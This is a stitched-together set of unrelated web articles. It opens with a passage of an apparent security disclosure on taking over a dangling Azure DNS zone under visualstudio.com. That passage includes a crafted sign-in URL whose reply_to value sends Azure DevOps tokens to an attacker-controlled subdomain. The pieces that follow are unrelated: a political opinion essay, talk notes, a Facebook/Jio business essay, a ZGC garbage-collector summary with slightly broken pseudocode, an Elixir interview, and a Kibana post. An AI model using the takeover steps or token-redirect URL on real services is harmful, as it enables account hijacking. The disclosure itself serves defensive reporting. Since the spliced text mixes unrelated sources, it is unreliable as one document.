      <td><em>Azure Console with <code>project-cascade.visualstudio.com</code> registered as a DNS Zone</em></td>
    </tr>
  </tbody>
</table>

<p><br>
From this point on wards, we registered two records:</p>

<ul>
  <li>TXT Record - <code>txt.project-cascade.visualstudio.com</code> with the value of <code>Azure DNS Zone Takeover POC</code> (proof of concept)</li>
  <li>A Record - <code>arec.project-cascade.visualstudio.com</code> with the value of <code>3.88.203.203</code> (our host)</li>
</ul>

<pre><code>$ dig txt txt.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
txt.project-cascade.visualstudio.com. 10 IN TXT "Azure DNS Zone Takeover POC"

$ dig a arec.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
arec.project-cascade.visualstudio.com. 2475 IN A 3.88.203.203

</code></pre>

<h2 id="so-whats-next">So, what’s next?</h2>

<p>Now that we had successfully taken the subdomain over, it was time to investigate the security impact.</p>

<p>We discovered that there were subdomains underneath <code>visualstudio.com</code> that facilitated an authentication flow through <code>login.microsoftonline.com</code>.</p>

<p>For example, when visiting  <code>app.vssps.visualstudio.com</code>, we were redirected to:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90#ctx=eyJTaWduSW5Db29raWVEb21haW5zIjpbImh0dHBzOi8vbG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSJdfQ2
</code></pre>

<p>Which then redirected to:</p>

<pre><code>https://login.microsoftonline.com/...omitted...
</code></pre>

<p>The most important thing to note from the URLs above, is the following parameter and value for the endpoint <code>https://app.vssps.visualstudio.com/_signin</code>:</p>

<p><code>reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F</code></p>

<p>Through some testing, we determined that this authentication flow had a loosely configured <code>reply_to</code> address, allowing any domain under <code>*.visualstudio.com</code> to recieve the authentication tokens.</p>

<p>In order to demonstrate this account takeover flow, we crafted the following URL:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>In the URL above, note that we changed the value of the <code>reply_to</code> parameter to contain the following: <code>https%3A%2F%2Farec.project-cascade.visualstudio.com%2F</code> (our subdomain takeover).</p>

<p>This will prompt the user to login via the normal microsoft live.com auth flow, or if the user is already logged in, proceed with the signin and redirect request.</p>

<p>This would result in their <code>app.vsaex.visualstudio.com</code> tokens being disclosed.</p>

<p>From this point, the the attacker would have full control over the user’s Azure DevOps account.</p>

<p>Additionally, the zone takeover of project-cascade.visualstudio.com could have beeen used to validate ownership over the <code>project-cascade.visualstudio.com</code> domain, setup MX records to capture emails to <code>*.project-cascade.visualstudio.com</code> and prove ownership to create SSL certificates. This may have resulted in various opportunities for fraud and impersonation of Microsoft services.</p>



<p>This attack could be mitigated at two points:</p>
<ol>
  <li>Not having the dangling dns zone <code>project-cascade.visualstudio.com</code></li>
  <li>Restricting the reply_to url for visualstudio tokens on <code>app.vssps.visualstudio.com</code> to the realm for <code>app.vsaex.visualstudio.com</code></li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3389">

<div>
<p>Those that know me, know that I am both bold and resolute. I stand by my thoughts / comments, yet I attempt to keep an open mind, analyze a situation, self-reflect on any biases, and integrate feedback. I even go so far as to analyze my confidence level, see <a href="https://predictionbook.com/" target="_blank" rel="noopener noreferrer">predictionbook.com</a>.</p>
<p>With that in mind. I want to share how utterly angry and helpless I feel —</p>
<p>I can’t share my true thoughts, hell my analysis, of the current political situation in the U.S. Although I have written on it countless times, I end up deleting the posts.</p>
<p>Why?</p>
<p>It’s not safe to share thoughts.</p>
<h2>State of Affairs</h2>
<p>Today, sharing one’s opinion can cost you your livelihood, your ability to communicate, and more.</p>
<p>Historically, that was always true, perhaps more-so. We’re now returning to the status quo — repression.</p>
<p>Today’s flavor of repression is one where offending someone randomly across the globe, can cost you your job. That person may not have a standing in your community and may not have a relationship with your employer. However, they can amplify their voice, tweet your employer, and your employer (scared out of it’s mind by the current situation) will terminate you. That is the state of affairs today. It doesn’t matter if you’re correct or innocent. It doesn’t even matter if 99.9% of people aren’t offended by what you said — we are now in a world of “<a href="https://en.wikipedia.org/wiki/Online_shaming#Cancellation" target="_blank" rel="noopener noreferrer">cancel culture</a>“.</p>
<h2>Finding Middle Ground</h2>
<p>In the United States in 2020, we have two paths. One path leads to an ever more left-leaning populous “uprising”; the other path leads to an ever more right-leaning populous “uprising”. I don’t see an alternative, outside of some quite-frankly comical alternatives (e.g. President Mitt Romney, with VP Bernie Sanders).</p>
<p>One way or another, I lose. No one is speaking up for my beliefs or representing me.</p>
<p>I sense I’m not alone. Everyone I speak to left or right, hates the current state of affairs. Most of us even agree on <em>why</em> we distrust the system. Unfortunately, we can’t elect someone to fix the system. Neither Trump, nor Biden, nor Bernie, nor anyone on the ballot accurately represents or even inspires us.</p>
<p>By and large, I believe this is due to the “absolute” nature of our current social strife. Take the question:</p>
<blockquote><p>Why can’t I be anti-vaccine and pro-choice?</p></blockquote>
<p>You would suspect everyone would agree that we “own” our bodies. If that were true, then you would effectively have to be pro-choice AND support people’s right to choose what to put in their bodies; body ownership is the middle ground. I wish we could coalesce around the middle ground, then compromise on edge cases, enabling progress.</p>
<p>Take another example:</p>
<blockquote><p>Why don’t we do firearms training in schools?</p></blockquote>
<p>It’s an honest question — we’ve had the 2nd amendment for hundreds of years. Similar to driving a car, we should train our youth to handle firearms. I suspect we all know the reason this is not occurring — because a significant portion of the United States is fearful of firearms.</p>
<p>From the evidence, the fear is unjustified. We have evidence that with a good training program and robust mental evaluation process, firearms by-and-large are safe for society. <a href="https://en.wikipedia.org/wiki/Firearms_regulation_in_Switzerland" target="_blank" rel="noopener noreferrer">See Switzerland</a>:</p>
<blockquote><p>Swiss males grow up expecting to undergo basic military training, usually at age 20 in the recruit school..</p>
<p>…Prior to 2007, members of the Swiss Militia were supplied with 50 rounds of ammunition for their military weapon in a sealed ammo box that was regularly audited by the government…</p>
<p>…Every person with a Swiss citizenship, aged 10 years or older, can take part at any federal ranges and will be able to shoot for free with the ordinance rifle…</p>
<p>…In 2016, there were 187 attempted and 45 completed homicides, for a homicide rate of 0.50 per 100,000 population, giving Switzerland one of the lowest homicide rates in the world…</p></blockquote>
<p>Further, firearms are already widely available (<a href="https://en.wikipedia.org/wiki/Estimated_number_of_civilian_guns_per_capita_by_country" target="_blank" rel="noopener noreferrer">300+ million guns in the U.S.</a>) &amp; availability enshrined in law.</p>
<p>Sorrowfully, evidence doesn’t matter here; fear guides many. Yoda has some insights here:</p>
<blockquote><p><span data-parade-type="promoarea" data-parade-location-types="promoarea" data-parade-location-ids="article" data-parade-views="false" data-parade-touches="false" data-parade-clicks="false" data-parade-mouseovers="false">Fear is the path to the dark side. Fear leads to anger. Anger leads to hate. Hate leads to suffering.</span></p>
<p>— George Lucas (Yoda)</p></blockquote>
<h2>The False Dichotomy</h2>
<p>I don’t agree with the left or the right on many things in United States politics. In fact, I find most of the arguments a false dichotomy, designed to garner votes. To share one’s full thoughts would cause either or both sides to lash out, even though evidence may support the claims / musings.</p>
<p>Regretfully, this leaves me and many others out of the public discourse. While most of us have heard,</p>
<blockquote><p>The only thing necessary for the triumph of evil is for good men to do nothing.</p>
<p>— Edmund Burke (attributed)</p></blockquote>
<p>It’s not quite that simple and I prefer another sentiment:</p>
<blockquote><p>A man dies when he refuses to stand up for that which is right. A man dies when he refuses to stand up for justice. A man dies when he refuses to take a stand for that which is true.</p>
<p>— Martin Luther King Jr.</p></blockquote>

I am very confident few people fully agree with either side in this political theater. We have extremists on either side shouting and being amplified by social media. In truth, the vast majority of us don’t agree [fully] with either extreme. Most of us, want to “live and let live” — that’s the American way. We’re a country founded on our hatred for taxes and the desire to live free from persecution. Please, please.. Don’t let that change.</p>
<p>It’s easy to decide “what’s right” when you look at it through that lens — am I persecuting others or increasing taxes (arguably a form of persecution)? If either are true, likely we should reconsider our stance.</p>
<h2>The Chaos</h2>
<p>Today, we are edging towards chaos. We all feel it. Riots, job loss, deadly diseases, [trade] wars, homelessness… We need leadership that can unite us.</p>
<p>Unfortunately, many of our would-be leaders have opted out or have been pushed out of this system. They’ve become engineers, scientists, bloggers — too scared to share their opinions (<a href="https://en.wikipedia.org/wiki/Slate_Star_Codex" target="_blank" rel="noopener noreferrer">even shutting down</a>). To hold a nuanced opinion different from the “socially accepted” by one group or another will get you “canceled”. In this case, “canceled” can mean anything from losing your job, to losing financial platforms/instruments (i.e. PayPal, VISA, YouTube revenue, etc.), to receiving threats on your life.</p>
<p>We have an ongoing pandemic, with millions in the United States likely about to perish, the economy collapsing, and we still cannot escape the politics.</p>
<p>I’m not hopeful.</p>
<p>I have so many musings, stories, and analyses I’d like to share, but neither facts nor my opinions matter.</p>
<p>Let’s be honest —</p>
<ul>
<li>I’m a white, cisgender, straight, male</li>
<li>I work as a technical manager in a research group, at a bank</li>
<li>I’m socially liberal in many ways and conservative in others</li>
<li>I grew up lower-middle class; now, I’m upper-middle class</li>
<li>I don’t attribute myself to any political party</li>
</ul>
<p>A large number of people dismiss or overlook me because of my background. Those who don’t outright dismiss me are also not likely to support my interest(s).</p>
<h2>Meritocracy or Bust</h2>
<p>What scares me is that I am a father and I am fearful for my children’s future. I was raised with the understanding that America is a meritocracy. Regardless of your race, gender, or creed, you should have the ability to make a life in the United States,<strong><em> to build a future for your children</em></strong>. Sadly, I don’t see the same core mission today. None of the political parties or the government at large appears forward-looking, for the children. Perhaps, that’s because of a <a href="https://www.cdc.gov/nchs/nvss/births.htm" target="_blank" rel="noopener noreferrer">declining birthrate</a>, I’m not sure.</p>
<p>As someone with children, I’m pleading for a group to come together to challenge the current status quo and equitably look to improve our society. We do have systemic problems that need to be fixed. Compromises will need to be made, but I don’t believe we need sacrifices from anyone.</p>
<p>The racism and sexism needs to stop. I suspect, most of us (though, not all) want a meritocracy, a hierarchy based on merit. Unfortunately, what’s being propagated is a hierarchy based on race, sex and orientation — the under-privileged. It’s clear from the countless stories we see in the news. I am sure you are tired of the racism, as am I. That’s probably true regardless of which side of the political spectrum you fall.</p>
<p><em>No one’s</em> value to society should be assessed by their race, gender or creed. A person’s value should be based off what they have to offer to a given group, organization, or society. We can rally around that idea (that we’re all equal, differentiated on merit) and work to improve. It’s a middle ground we can [mostly] agree on. From there, we can fix the injustices.</p>
<p>What horrifies me, is that even to express that <em>“we’re all equal” </em>is a challenge to this new socio-economic hierarchy. <em>No one</em> is representing me or has my family’s best interests in mind. Realistically, I don’t expect anyone to have <em>my family’s interests</em> in mind, but I don’t want my potential / rights eroded.</p>
<p>Due to this political tug of war, both sides of the political spectrum want to diminish our rights; they’re only bickering over which rights to diminish. Let’s stop this tug of war and come together.</p>
<p>If we don’t come together, soon enough we won’t have a democracy, or frankly, a future to build for.</p>
<h2>In the Words of John Adams…</h2>
<blockquote><p>Remember, democracy never lasts long. It soon wastes, exhausts, and murders itself. There never was a democracy yet that did not commit suicide. It is in vain to say that democracy is less vain, less proud, less selfish, less ambitious, or less avaricious than aristocracy or monarchy. It is not true, in fact, and nowhere appears in history. Those passions are the same in all men, under all forms of simple government, and when unchecked, produce the same effects of fraud, violence, and cruelty. When clear prospects are opened before vanity, pride, avarice, or ambition, for their easy gratification, it is hard for the most considerate philosophers and the most conscientious moralists to resist the temptation. Individuals have conquered themselves. Nations and large bodies of men, never.</p>

<h2 id="details">Details</h2>
<p>This is the talk on moving beyond surveillance capitalism with alternatives, stopgaps, and the Small Web that Aral gave at <a href="https://creativemornings.com/talks/aral-balkan">Creative Mornings Istanbul</a> on 26 June, 2020.</p>
<p>The recording of the live stream has been edited to:</p>
<ul>
<li>
<p>Fix the 3-frame audio/video sync (live and learn: all HDMI output has a delay and if you are bringing in your microphone separately, you need to delay it while streaming/recording it).</p>
</li>
<li>
<p>Reduce audio levels (like a rookie, I didn’t check my levels before starting the live stream so the audio is clipped. Can’t fix that but I lowered the audio track so at least now it’s not booming in your ears.)</p>
</li>
<li>
<p>Cut out a part of my bumbling conclusion where I forgot the switcher on my screen instead of switching to my camera and then did a second awkward conclusion to camera when I realised.</p>
</li>
</ul>
<p>We’ve also added closed captions (made using thisten.co), chapters (so you can skim/jump to relevant sections), and links to the tools mentioned in the talk.</p>
<p>All in all, not terrible for a first live stream with our new live stream setup.</p>

<p>In the&nbsp;<a target="_blank" href="https://thezentech.co/2020/05/25/are-online-ads-a-bubble-seriously/" rel="noreferrer noopener">previous essay</a>, I talked about that Facebook’s primary revenue source is from online ads.</p>



<blockquote><p>Well, there is no easy way to say that, but 98% of Facebook revenue is coming from online ads. So it’s not a big surprise that they are one of the most affected companies by both surges of usage as people are using Facebook, Instagram, Whatsapp more heavily, and decrease of marketing spend on ads on its platform. So ads for Facebook are basically a matter of existence.</p></blockquote>



<p>So It is smart – or a strategic necessity as I will explain in a minute – that they are trying to find different revenue streams.</p>



<p>In the last Facebook’s earnings call, Mark Zuckerberg said:</p>



<blockquote><p>I have always believed that in times of economic downturn, the right thing to do is to keep investing in building the future, and I believe this for a few reasons. First, when the world changes quickly, people have new needs and that means that there are more new segments to build. Second, since many big companies will pull back on their investments, there are a lot of things that wouldn’t otherwise get built, but that we can help deliver.[..] we’re planning to hire at least 10,000 more people in product and engineering roles this year, so we can continue building and making progress.</p><cite>Mark Zuckerberg – Facebook earnings call 2020 Q1</cite></blockquote>



<p>Afterward, Facebook invested $5.7 billion for a 9.99% stake in India’s Reliance Jio Platforms as the largest single investment in Facebook’s history.</p>



<p>Jio Platforms is connecting more than 388 million people in India to the internet. And if we look at the following chart. The number of internet India is so high in comparison with the US and EU.</p>

<div><p>That is not the first try from Facebook to enter the Indian market. They saw India as the future for growth since 2013. But their attempts failed in 2016 after regulation blockers over Free Internet Initiative and providing payment solution for WhatsApp.</p><p>This time they tried a different approach by partnering with Reliance Jio, the largest telecom provider in India, To avoid getting in conflict with the Indian government direction to empower the Indian companies.</p></div>



<p>This investment has three main strategic advantages:</p>



<h3>1- Facebook + Instagram vs. TikTok</h3>



<p>In recent years, TikTok, the app owned by the Chinese giant ByteDance has got a market share in India that all the US Tech companies – including Facebook – couldn’t acquire.</p>



<blockquote><p>In recent years, ByteDance’s TikTok has won users that all of these companies have struggled to reach. TikTok has amassed more than 250 million users in India (as of last year), and the company says it is on track to add another 100 million this year.</p><cite>TechCrunch</cite></blockquote>



<p>But not just in India. Tiktok already got a significant market share in many different countries as a social platform. And I think Facebook bearly started to take any action against the viral usage of Tiktok, especially between teenagers.</p>



<p>That’s the first reason which serves – still – into increasing Ads revenue stream. But in general, Facebook couldn’t monetize the increasing users’ usage in Asia compared to users in the US and Europe.</p>

<p>So that leads us to the second strategic advantage.</p>



<h3><strong><strong>2- E-commerce via WhatsApp and an opportunity for a SuperApp</strong></strong></h3>



<p>In one of the future essays, I want to dig deeper into the story of WeChat, the Chinese SuperApp. And this related to today’s essay since Facebook has an opportunity to transfer WhatsApp into a similar user experience in the Indian market. The same try that Careem – now owned by Uber – is seeking in the Middle East. See the market pattern?</p>



<p>Reliance Jio also wants to take on Amazon in e-commerce in India, but to take on Amazon, they can’t play like Amazon! As Brad Pitt stated in Moneyball in a different context about the Yankees.</p>

<p>WhatsApp is already popular in India, but as I mentioned before, Facebook couldn’t pass the regulation to add payment service to WhatsApp to be able to monetize it. But after the partnership, Facebook could enter the e-commerce market in India much more comfortably. Either with more government-friendly WhatsApp solution or via JioMart service. As Mukesh Ambani (Reliance Jio’s largest shareholder) referred to in the deal announcement:</p>



<blockquote><p>Ambani added that JioMart and WhatsApp will enable 30 million neighborhood stores (kirana) to transact digitally “in the near future.” WhatsApp has been working with the Indian government for more than two years to expand its payments service in India — but the project remains stuck in regulatory hurdles.</p><cite>Mukesh Ambani</cite></blockquote>



<p>Facebook introduced WhatsApp for business a few months ago. And as they described, the main feature in WhatsApp blog is adding products catalog inside WhatsApp, so users don’t need to go to external websites. Then all from products exploring to payment process (later on) could be done entirely within WhatsApp experience.</p>



<blockquote><p>Catalogs are a mobile storefront for businesses to showcase and share their goods so people can easily browse and discover something they would like to buy. Previously businesses had to send product photos one at a time and repeatedly provide information — now customers can see their full catalog right within WhatsApp. This makes business owners look more professional and keeps customers engaged in the chat without having to visit a website.</p><cite>WhatsApp blog</cite></blockquote>



<p>Fun note, the feature demo in WhatsApp blog is for a local Indian store. Good one WhatsApp 😉</p>

<h3><strong>3- Reliance Jio + Facebook vs. Amazon</strong></h3>



<blockquote><p>With only about half of India’s 1.3 billion people online so far, e-commerce sales are projected to more than double to $68.4 billion by 2022 from $26.9 billion in 2018</p><cite>Wall Street Journal</cite></blockquote>



<p>With the promising opportunity in India, someone else was watching. Who knows a lot about e-commerce, Jeff Bezos.</p>



<p>Jeff Bezos visited India recently to announce an extra $1 Billion investment – after the initial investment $5 Billion -, and told a gathering of local Amazon sellers:</p>



<blockquote><p>The intent is to help more small businesses start selling on the company’s marketplace. The new funds will supplement the $5 billion that Amazon has said it is spending to build out its Indian business […] We’re making this announcement now because it’s working,” Mr. Bezos said referring to Amazon’s efforts to get India’s legions of mom-and-pop shops connected to its platform. “And when something works, you should double down on it.”</p><cite>Wall Street Journal</cite></blockquote>



<p>It’s interesting to see and learn from what’s happening in India in the near future since similar competition fields happen in other places like in Africa or the Arabic world while big tech companies are looking to the east for strategic opportunities.</p>

This work was done in collaboration with <a href="https://www.oracle.com/">Oracle</a> which gave me an opportunity to work with brilliant minds on challenging problems. I want to direct a special shoutout to my mentors at Oracle, <a href="https://inside.java/u/PerLiden/">Per Lidén</a> and <a href="https://inside.java/u/ErikOsterlund/">Erik Österlund</a>.</p>

<p>To allow fast allocation in garbage collected environments, a common approach is to use bump pointer allocation. Bump pointer allocation uses a pointer to the first available byte in memory that is monotonically increased as we continue to allocate objects. While this scheme allows fast allocation it comes with the caveat that the free memory must be kept continuous. To keep the free memory continuous, many garbage collectors move objects around in memory to compact them, thereby avoiding fragmentation, which can be seen in the figure below. This is typically handled in a process where all live objects are moved off of a page which is then free’d. This permits clearing a page in O(live) objects, which is typically a small number (relatively speaking) since most newly created object tend to die pretty quickly.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/heapgc_defrag.png" alt="Defragmentation during GC"></p>

<p>The Z Garbage Collector (ZGC) is a new moving concurrent garbage collector in OpenJDK (the thing that probably runs your Java application) [1, 2]. ZGC moves objects around, to combat memory fragmenation, without stopping the application.
This imposes additional overhead on an application in the form of tracking objects’ movements, so that all pointers to them can eventually be updated to the new locations. Usually in GC parlance this is referred to as forwarding information.</p>

<p>ZGC uses an auxiliary forwarding table – optimised for fast look-up, at the cost of additional memory use. This forwarding table is stored outside of the Java heap, referred as off heap-allocation. Any off-heap allocation or keeping old object after moving them is to be considered as memory overhead since it is strictly needed for the JVM and not the actual Java application. ZGC suffers from pathological cases where the size of its forwarding information can become very large, theoretically, as big as the heap itself. If we dimension an application for the pathological case this would be a waste of resources, since the memory usage is usually significantly less. This can make it hard to determine an application’s memory requirements.</p>

<p>This risk for large memory overhead is not only a theoretical concern, but can be observed in real programs. Below is a plot depicting the memory overhead for an internal benchmark application called BigRamTester at Oracle, which shows 35% memory overhead. The source code for that application can be found in <a href="https://bugs.openjdk.java.net/browse/JDK-8152438">this issue </a> as an attachment.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/bigram.png" alt="Benchmark Revealing Large Memory Overhead"></p>

<p>Storing forwarding information for each relocated object from addresses A (the from-address) to B (the to-address), costs approximately 128 bytes (64 bytes for each from/to-address), can be implemented computationally efficient but at the cost of additional memory overhead (as shown above). As part of my thesis work, we propose a new design for forwarding tables that maps several sparesly populated pages (i.e., with few live objects) onto a single new page in a way that allows the to-address to be calculated using the from-address and liveness information. The design results in a compressed forwarding table that incurs a theoretical worst-case memory overhead of &lt; 3.2%.</p>

<p>In ZGC, there may be contention between application threads and garbage collector threads of relocating objects. The contention results in nondeterministic addresses to which objects are relocated to. The new design requires <em>deterministic addresses</em> so that we can calculate the new address given some set of information. Assume that we have an old page X, whose objects will be relocated to the new page Y. We achieve deterministic addresses, if we copy the objects to Y in the order we encounter them when traversing the live map from the beginning to the end, in ascending order.</p>

<p>The new design divides pages into Q amount of chunks. A chunk holds the amount of preceding living objects <em>before</em> that chunk. To get the size of previously living objects you will use the associated chunk and scan the live map for the addresses who wasn’t covered by the chunk. This allows X to be computed efficiently and allows the old page to be freed as soon as all objects have been relocated, at the cost of some space. An example of dividing a page into chunks is depicted below.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/chunks.png" alt="Chunks"></p>

<p>Each page divider corresponds to one chunk’s live map coverage. In the example, an object to be relocated lives on the third page which covered by the third chunk (the green arrow). To find the address we do not have to scan the previous chunks since the <em>live bytes</em> field is describing the amount of live bytes of all preceding chunks (the red arrow). Finding all living objects (and their size) preceding the green object within the chunk, can be found in the live map (the yellow arrow).</p>

<p>This design results in a simple logic in order to calculate the new address, which in pseudocode would be express as:</p>

<div><div><pre><code><span>inline</span> <span>uintptr_t</span> <span>ZCompactForwarding</span><span>::</span><span>to_address</span><span>(</span><span>uintptr_t</span> <span>from_address</span><span>)</span> <span>{</span>
  <span>uintptr_t</span> <span>to_page_start_address</span>    <span>=</span> <span>to_page_start_address</span><span>(</span><span>from_address</span><span>);</span>
  <span>uintptr_t</span> <span>live_bytes_before_chunks</span> <span>=</span> <span>live_bytes_before_chunks</span><span>(</span><span>from_address</span><span>)</span>
  <span>uintptr_t</span> <span>live_bytes_on_chunks</span>     <span>=</span> <span>live_bytes_on_chunks</span><span>(</span><span>from_address</span><span>);</span>

  <span>return</span>
    <span>to_page_start_address</span> <span>+</span>
    <span>live_bytes_before_chunk</span> <span>+</span>
    <span>live_bytes_on_chunks</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The implementation was shown to have a maximum of &lt; 3.2% memory overhead. I used the DaCapo benchmarks suite and the SPECjbb2015 benchmark to evaluate the impact of the design on execution time, given that forwarding addresses must now be computated, as opposed to looked up. Naturally, we expected some performance degradation.
The results from the benchmarking show an statistically significant average performance degradation of approximately 2%, for the new design. Notably, many programs in DaCapo were not effected at all. Two DaCapo programs saw performance improvements at 5.69% and 22.42%, respectively, for the new design.</p>

<p>I haven’t implemented all optimizations on my list (yet). But I’m fairly hopeful that decrease in memory footprint and predictable overhead outweighs the increase in execution time, as incidated by the measurements. This could mean that the work you’d just read about will hopefully find its way into OpenJDK. Only time will tell.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this article, we’re interviewing Nathan Johnson, one of the co-founders of <a href="https://beta.venu.tv/">Venu</a>, a community-driven online marketplace for virtual events. Venu is written in Elixir and has recently gone into beta, so we thought it would be an excellent opportunity to learn more about the choice and advantages of using Elixir for one’s startup. If you want to learn about their stack and how Phoenix LiveView enabled them to build their app quickly (3 months of part-time work), read on.</p><h3 id="interview-with-nathan-johnson">Interview with Nathan Johnson</h3><h4 id="could-you-tell-us-more-about-your-company-and-your-role-there%3F">Could you tell us more about your company and your role there?</h4><p>Sure thing. Venu is a marketplace for live events/experiences. It allows organizers to create/sell tickets, set up schedules and multi-track events, and live stream those events in the same vein as Twitch or Mixer. Its focus is on conferences but can be used for any live-streamed content.</p><p>I am one of the co-founders along with Brodey Newman and Dillon Chanis. I do a good bit of the backend development/integrations.</p><p><img src="https://serokell.io/files/67/675pkgmd.team2.jpg" alt="Venu team"></p><hr><center><i>
	The co-founders of Venu.</i></center><h4 id="could-you-talk-about-the-stack-of-venu%3F-any-particular-elixir-libraries-that-you-want-to-feature%3F">Could you talk about the stack of Venu? Any particular Elixir libraries that you want to feature?</h4><p>Our stack is Elixir + Phoenix LiveView + Alpine.js + Tailwind CSS hosted on Gigalixir with a couple of AWS services (S3/CloudFront).</p><p>LiveView has enabled us to build the app in about three months part-time and is definitely worth mentioning. It can be a bit of a learning curve, and new things are always being added to it, but the velocity it gives you is well worth it. You don’t have to worry about the plumbing of how data gets from your backend to the frontend so you can focus primarily on the UI/presentation layer. LiveView isn’t a 1.0 release yet, so there have been some challenges with new releases coming out and some bugs, but overall it’s been fantastic.</p><h4 id="do-you-use-any-erlang-libraries-in-elixir-code%3F-if-so%2C-are-there-any-you-would-like-to-feature%3F">Do you use any Erlang libraries in Elixir code? If so, are there any you would like to feature?</h4><p>Nothing third-party, but some of our prototype streaming code is using the raw <code>:ssl</code> and <code>:gen_tcp</code> libraries.</p><h4 id="do-you-use-distributed-erlang-functionality-for-cross-node-message-passing%3F-why-or-why-not%3F">Do you use distributed Erlang functionality for cross-node message passing? Why or why not?</h4><p>Currently, we don’t use cross-node messaging because we can run everything off a single replica, but we built our app with that in mind. For instance, our code that manages the state of a live stream, users connected, etc. is all GenServers, so if we need to scale out, we can transition from a single node to multiple nodes with message passing easily.</p><h4 id="do-you-have-non-beam-code-in-your-codebase%3F-if-so%2C-how-much-and-why%3F">Do you have non-BEAM code in your codebase? If so, how much and why?</h4><p>Only some of our front end is non-BEAM because we didn’t want to put things like which modals/dropdowns were open in our LiveView state. We’ve considered writing some Rust for the live streaming as well, but Elixir works pretty well for that.</p><h4 id="where-is-elixir-great-to-use-and-where-does-it-fall-short-in-your-stack%3F">Where is Elixir great to use and where does it fall short in your stack?</h4><p>Elixir has been great for everything so far. A lot of our codebase right now is a simple Phoenix app managing some basic content, but even the complex stuff like payouts via Stripe and the live streaming has been trivial as well. The only thing we had any real issues with was deployment, but we’ve been using Gigalixir and it makes that process extremely simple.</p><h4 id="what-was-the-biggest-challenge-you%E2%80%99ve-overcome-while-working-on-this-project%3F-if-elixir-helped-you-to-solve-it%2C-how%3F">What was the biggest challenge you’ve overcome while working on this project? If Elixir helped you to solve it, how?</h4><p>We had a couple of major challenges. The first one: an ongoing issue with time zones that is not that fun to talk about but is easily solved with Elixir’s Timex library. The other one was handling real-time content, which is pretty interesting.</p><p>For our app, we need to keep everyone in sync when viewing/messaging on a live stream. Elixir definitely helped solve this in a simple way. Phoenix has built-in Pub/Sub functionality that allows us to broadcast and subscribe from our LiveView instances. So, we can easily publish updates for when a stream starts/stops or when new messages come in, and the UI updates in real-time because of the magic of LiveView.</p><p><img src="https://serokell.io/files/60/60wm93ma.venu_meta.png" alt="60wm93ma.venu_meta.png"></p><hr><center><i>You can try out Venu by <a href="https://beta.venu.tv/">signing up</a> for its closed beta. </i></center><h4 id="are-you-satisfied-with-the-result%3F">Are you satisfied with the result?</h4><p>Absolutely. It has definitely come a long way over the past three months, and I look forward to what’s to come.</p><h4 id="what-is-your-scaling-strategy-post-launch%3F">What is your scaling strategy post-launch?</h4><p>After we’ve ironed out the bugs from our beta, we’ll be primarily focused on marketing and landing larger and larger conferences. Our app leverages some heavy third-party integrations to do the payments/streaming, so we should be able to scale well with what we have in place.</p><h4 id="any-key-takeaways%3F">Any key takeaways?</h4><p>I would encourage anyone who hasn’t had the opportunity to check out Phoenix LiveView to take a minute to do so. It changes the way you think about building applications and, even though it is still pre 1.0,  is definitely worth investing in. It’s also a good way to get introduced to the joy of Elixir programming.</p><hr><p>We want to thank Nathan for taking his time to talk with us, and wish the best of luck to Venu and its team!</p><p>If you want to read more about companies using functional programming in production, we suggest you check out our <a href="https://serokell.io/blog/haskell-in-production">Haskell in Production</a> articles or our overview of <a href="https://serokell.io/blog/elixir-companies">the largest Elixir-using companies</a>.</p><p>If you have your own Elixir in production story to tell (both good and bad), we definitely want to hear it!

July 1, 2020 | https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>We’re excited to share more details today about a long-running project that the Kibana team has been working on for the past couple of years: the Kibana development platform.&nbsp;
</p><p>If you’re a Kibana plugin developer or enjoy lurking around our GitHub repo, you’ve probably seen mentions of “the new platform.” This is a re-architecture project we’re close to completing that enables the future of Kibana plugin development for both developers at Elastic and the wider Kibana community. So why did we build this? Let’s start with a bit of history.
</p> <p><strong><h2>Kibana 4.0, a modest JavaScript app</h2></strong></p><p>The first “architecture” of Kibana was put together all the way back in 2015, <a href="https://www.elastic.co/blog/kibana-4-literally/">starting with Kibana 4.0</a>. At the time, we had just three apps: Discover, Visualize, and Dashboard. Even more critically, we only had four full-time developers.
</p><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltf50f9b7f4bece58d/5ef67b9ca917b92b287f6677/blog-new-kibana-arch-4-0.jpg" data-sys-asset-uid="bltf50f9b7f4bece58d" alt="Kibana 4.0: Not too shabby for only having four full-time developers"></p><p>With such a small team, we reached for familiar libraries and built Kibana around them: Angular.js, Express, and RequireJS. We added Hapi.js and used Hapi’s plugin system to build server-side plugins. On the front end, each application was a separate Angular.js app built on some shared code. Using familiar tools allowed us to iterate quickly, avoid reinventing the wheel, and ship features at a whiplash pace. It worked well!
